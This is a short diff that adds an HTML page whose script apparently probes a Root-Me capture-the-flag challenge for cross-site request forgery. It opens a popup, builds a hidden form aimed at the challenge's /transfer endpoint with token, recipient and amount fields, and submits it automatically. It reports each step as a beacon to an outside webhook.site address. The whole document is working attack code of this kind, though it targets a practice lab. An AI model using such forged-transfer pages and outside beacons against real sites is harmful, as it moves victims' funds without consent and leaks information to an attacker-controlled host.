@@ -1,0 +1,19 @@
+<!DOCTYPE html><html><body><script>
+var wh = 'https://webhook.site/f5af0355-1e19-423e-8665-14603d26667f';
+function beacon(params){ var i = new Image(); i.src = wh + '?' + params; document.body.appendChild(i); }
+beacon('diag2=start');
+var w = window.open('about:blank', '_blank');
+if (w) {
+  beacon('diag2=popup_opened');
+  var f = w.document.createElement('form');
+  f.action = 'https://instance-019fb331-4295-70b3-86a1-6c6fdbf50662.challenges.root-me.pro/transfer';
+  f.method = 'POST';
+  f.innerHTML = '<input name="token" value="0000000000000000000000"><input name="recipient" value="doesnotexist"><input name="amount" value="1">';
+  w.document.body.appendChild(f);
+  f.submit();
+  beacon('diag2=form_submitted');
+} else {
+  beacon('diag2=popup_BLOCKED');
+}
+setTimeout(function(){ beacon('diag2=end'); }, 2000);
+</script></body></html>
